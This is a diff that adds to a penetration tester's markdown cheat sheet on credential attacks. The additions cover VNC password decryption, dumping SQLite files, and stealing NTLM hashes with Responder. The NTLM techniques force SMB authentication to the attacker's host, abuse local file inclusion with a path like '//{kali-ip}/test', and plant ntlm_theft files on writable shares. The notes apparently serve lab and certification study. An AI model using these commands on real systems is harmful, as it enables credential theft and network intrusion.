@@ -41,6 +41,9 @@
 - ``` openssl pkcs12 -in {xxx.pfx} -nocerts -out key.pem -nodes ``` Get private key
 - ``` openssl pkcs12 -in {xxx.pfx} -nokeys -out key.cert ``` Get public key
 
+## VNC decrypt
+- https://github.com/frizb/PasswordDecrypts
+
 ## Cracking with Hashcat
 - Work w/ mutated password list (rockyou/other list)
 - hashcat rule explained: [https://github.com/zh54321/hashcat_rule_gen ](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
@@ -52,6 +55,9 @@
 
 - Hash mode: https://hashcat.net/wiki/doku.php?id=example_hashes
 - Hash type analyzer: https://www.tunnelsup.com/hash-analyzer/ 
+
+## DB File dump
+- ``` sqlite3 {xxx.db} .dump ```
 
 ## Password manager 
 - e.g. keepass
@@ -112,11 +118,24 @@
 
 # NTLM v2
 - More like unpriv users
-## Crack
+## Stealing NTLM Hashes
 - ``` net user xxx``` see if can rdp
 - ``` sudo responder -I tun0 ``` rogue receiver to dump request from http , smb etc
 - ``` dir \\LHOST\test ``` to post hash NTLM
 - NTLM v2 Hash crack
+### Can be abusing LFI also if LFI will use SMB or windows services
+- ``` python3 responder.py -I tun0``` alternatives app
+- e.g. ``` /index.php?view=//{kali-ip}/test
+- Re check the data ``` sqlite3 responder.db .dump```
+
+## Putting theif executable in SMB (If writable)
+1. NTLM-Theif https://github.com/Greenwolf/ntlm_theft
+   ```
+    python3 ntlm theft.py -g all -s {ip} -f {foldername}
+   ```
+2. cd to the folder 
+3. Start respond.py in another place
+4. ``` put {file} ``` try which works
 
 ## Skill of including filename of smb for HTTP server load uploaded file
 - change file name to ``` \\\\LHOST\\share\file.name ```
